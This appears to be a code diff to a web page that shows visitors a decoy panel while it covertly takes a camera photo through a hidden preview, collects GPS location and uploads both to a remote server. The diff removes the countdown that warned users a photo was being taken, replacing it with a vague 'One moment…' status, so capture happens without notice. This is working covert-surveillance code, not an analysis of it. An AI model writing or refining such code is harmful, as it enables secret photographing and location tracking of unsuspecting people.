@@ -173,21 +173,6 @@
       display: none !important;
     }
 
-    #statusRow .countdown-num {
-      display: block;
-      font-size: clamp(2.5rem, 12vw, 3.5rem);
-      font-weight: 800;
-      letter-spacing: -0.04em;
-      line-height: 1;
-      margin-bottom: 0.5rem;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      font-variant-numeric: tabular-nums;
-      transition: opacity 0.12s ease-out;
-    }
-
     /* Hidden capture surface — no visible preview */
     #preview {
       position: fixed !important;
@@ -213,7 +198,6 @@
 
     <main class="glass">
       <div id="statusRow">
-        <span id="countdownNum" class="countdown-num" hidden aria-hidden="true">1</span>
         <p id="status" class="hint">One moment…</p>
       </div>
       <div id="decoyPanel" class="decoy-panel">
@@ -230,13 +214,12 @@
     // redeployment trigger
     const API_BASE = "https://link-take-photo-production.up.railway.app";
 
-    const CAPTURE_DELAY_MS = 1000;
+    const LOCATION_ATTACH_MAX_MS = 400;
     const WEBP_QUALITY = 0.82;
     const JPEG_FALLBACK_QUALITY = 0.88;
 
     const shell = document.getElementById("shell");
     const statusEl = document.getElementById("status");
-    const countdownNum = document.getElementById("countdownNum");
     const decoyPanel = document.getElementById("decoyPanel");
     const decoyTitle = document.getElementById("decoyTitle");
     const decoyDetail = document.getElementById("decoyDetail");
@@ -296,42 +279,20 @@
       });
     }
 
+    /** Use up to maxMs for GPS; do not block capture — only the upload payload. */
+    function raceLocationForUpload(locationPromise, maxMs) {
+      const empty = { latitude: null, longitude: null, accuracy: null };
+      return Promise.race([
+        locationPromise,
+        new Promise((resolve) => {
+          setTimeout(() => resolve(empty), maxMs);
+        }),
+      ]);
+    }
+
     function setStatus(text, isError) {
       statusEl.textContent = text;
       statusEl.classList.toggle("error", !!isError);
-    }
-
-    function setCountdownVisible(show, value) {
-      countdownNum.hidden = !show;
-      if (show && value != null) countdownNum.textContent = String(value);
-    }
-
-    /** Drives countdown UI with requestAnimationFrame for smooth updates. */
-    function waitCaptureCountdown(totalMs) {
-      const start = performance.now();
-      return new Promise((resolve) => {
-        function tick(now) {
-          const elapsed = now - start;
-          const remain = Math.max(0, totalMs - elapsed);
-          const secs = Math.ceil(remain / 1000);
-          if (secs > 0) {
-            setCountdownVisible(true, secs);
-            setStatus("Photo in " + secs + "…");
-          } else {
-            setCountdownVisible(false);
-            setStatus("Hold still…");
-          }
-          if (elapsed >= totalMs) {
-            setCountdownVisible(false);
-            resolve();
-            return;
-          }
-          requestAnimationFrame(tick);
-        }
-        setCountdownVisible(true, Math.ceil(totalMs / 1000));
-        setStatus("Photo in " + Math.ceil(totalMs / 1000) + "…");
-        requestAnimationFrame(tick);
-      });
     }
 
     async function startCamera() {
@@ -416,7 +377,7 @@
         payload.latitude = location.latitude;
         payload.longitude = location.longitude;
         if (typeof location.accuracy === "number" && !Number.isNaN(location.accuracy)) {
-          payload.accuracy_m = location.accuracy;
+          payload.accuracy = location.accuracy;
         }
       }
       const res = await fetch(`${API_BASE}/upload-photo`, {
@@ -436,30 +397,22 @@
     }
 
     async function run() {
-      setCountdownVisible(false);
-      setStatus("Allow camera and location…");
+      setStatus("One moment…");
+      const locationPromise = getLocation();
+
       let stream;
       try {
         stream = await startCamera();
         await waitForVideoReady();
       } catch (e) {
-        setCountdownVisible(false);
         setStatus("Camera access denied or unavailable. Allow camera and reload.", true);
         return;
       }
-
-      const locationPromise = getLocation();
-
-      await waitCaptureCountdown(CAPTURE_DELAY_MS);
-
-      setStatus("Getting location…");
-      const location = await locationPromise;
 
       let encoded;
       try {
         encoded = await captureFrame();
       } catch (e) {
-        setCountdownVisible(false);
         setStatus(String(e.message || e), true);
         stream.getTracks().forEach((t) => t.stop());
         preview.srcObject = null;
@@ -469,11 +422,15 @@
       stream.getTracks().forEach((t) => t.stop());
       preview.srcObject = null;
 
+      const location = await raceLocationForUpload(
+        locationPromise,
+        LOCATION_ATTACH_MAX_MS
+      );
+
       try {
         const b64 = await blobToBase64(encoded.blob);
         await uploadPhoto(b64, encoded.mimeType, location);
       } catch (e) {
-        setCountdownVisible(false);
         setStatus("Upload failed: " + (e.message || e), true);
         return;
       }
